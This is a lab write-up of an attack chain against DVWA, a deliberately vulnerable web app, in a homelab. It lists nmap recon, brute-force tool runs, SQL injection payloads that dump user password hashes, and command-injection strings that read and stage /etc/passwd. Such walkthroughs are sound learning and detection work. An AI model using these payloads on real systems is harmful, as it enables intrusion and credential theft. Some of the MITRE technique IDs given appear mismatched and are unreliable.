# First Attack protocol on DVWA
In this protocol i would do a simple attack chain aiming to get the first glance towards penetration testing of a Web Application and correlating it with logs created and gathered by Wazuh-Agent

## Attack Chain
Attack chain would consist of:
Reconnaissance -> Authentication Brute Force -> SQL Injection and Data Exfiltration -> Command Injection to RCE

## Tools used
- DVWA docker image on Debian server set to low security
- Kali Linux Virtual Machine
- Self-written login bruteforce tool in Python
- Self-written directory bruteforce tool in Go

## Reconnaissance
I will be starting with a nmap scan towards the DVWA domain, for seeing open ports and possible services
```bash
nmap -A -T4 -sV -sC dvwa.lab.local
```
![Nmap Scan](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/nmap_scan_result.png)
After examining the Scan report, we notice exposed headers of the nginx and also SSH port open, which opens up another angle for an attack
To gather more informatino we probe the Web Application for directories, with directory_bruteforce.go by running:
```bash
go run directory_bruteforcer.go dvwa.lab.local ~/path/to/wordlist
```
After the report, we notice several misconfigurations and attack angles
![Dirbrute Scan](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/dirbrute_scan_result.png)

## Authentication Brute Force
After gathering first information about the target, we try to bruteforce the DVWA login. I will be using my written script in python by running:
```bash
python3 bruteforce_login_dvwa.py -u ~/path/to/usernames -p ~/path/to/passwords -t http://dvwa.lab.local/login.php --threads 5
```
![Cred Match](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/cred_match.png)
After the credential hit, we login into the DVWA Web Login page (ignore the no credentials output, as its the quirks of multi-threading)
![DVWA Web Application](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/dvwa_web.png)
We navigate towards SQL Inject section

## SQL Injection and Data Exfiltration
We start by trying to create an error to confirm that Input is not sanitized
```sql
'
```
![SQLIv1](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/first_sqli.png)
We config that the input data will not be sanitized, so we try several different ones:
- dump all users
```sql
1' OR '1'='1
```
![Basic User Extraction](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/sql_2.png)
Now we try to determine the number of columns by:
```sql
1' ORDER BY 1--
1' ORDER BY 2--
1' ORDER BY 3--
```
In this error-based detection is not useful, as its unclear off the error what amount of columns are present
We deviate to the UNION method
```sql
1' UNION SELECT null, null-- -
```
![Union probing](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/sql_3.png)
We get an error-free answer, which allows us to build upon this Union and try to confirm the Database name
```sql
1' UNION SELECT null, database()-- -
```
![Union probing](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/sql_4.png)
Now we try and exfiltrate the passwords of the users, its also possible to use different termination symbols in this case i would be using `#`
```sql
1' UNION SELECT user, password FROM users#
```
![Union probing](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/sql_5.png)
We successfully exfiltrated passwords hashed with MD5 algorithm. Those being vulnerable to offline cracking and could be exploitet after cracking
Now we navigate to Command Injection

## Command Injection to RCE
To confirm the injection, we exploit the bash syntax and try to chain couple of command together
Firstly we want to get more information about the host machine
```bash
127.0.0.1 && whoami
```
We run a ping into loopback and try to get the name of the user running the application
![Whoami](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/rce1.png)
Now we run several other commands, to gather as much information as possible
```bash
127.0.0.1 && hostname
127.0.0.1 && id
127.0.0.1 && uname -a
```
This way we determine that our target is:
- the dvwa application is a 33rd process
- system is Linux, 6.12.73+deb13 to be exact

Now we try to exfiltrate/read sensitive Files, as for example /etc/passwd
```bash
127.0.0.1 && cat /etc/passwd
```
We find full system user list
![Passwords](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/rce2.png)

Lastly we will try to Data Staging:
```bash
127.0.0.1 && cat /etc/passwd > /tmp/exfil.txt && ls /tmp
```
We can see a succesful RCE
![Data Staging](https://outercastl3.github.io/cybersecurity_homelab_setup/scenarios/dmz-lab/attacker_protocols/screenshots/rce3.png)


## Mitre ATT&CK Mapping
- T1423 - Network Service Scanning
- T1595.003 + T1420 - Wordlist scanning + File and Directory Discovery
- T1110 - Brute Force
- T1190 - Exploit Public-Facing Application
- T1210 - Exploitation of Remote Services

## Author
Bogdan Ermakov

